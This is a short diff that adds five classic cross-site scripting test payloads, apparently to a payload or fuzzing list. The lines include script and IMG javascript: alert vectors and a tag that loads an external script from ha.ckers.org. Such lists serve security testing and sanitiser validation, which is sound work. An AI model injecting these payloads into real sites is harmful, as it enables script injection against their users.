@@ -1,0 +1,5 @@
+<script>alert(1)</script>`
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert("XSS")>
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<BGSOUND SRC="javascript:alert('XSS');">
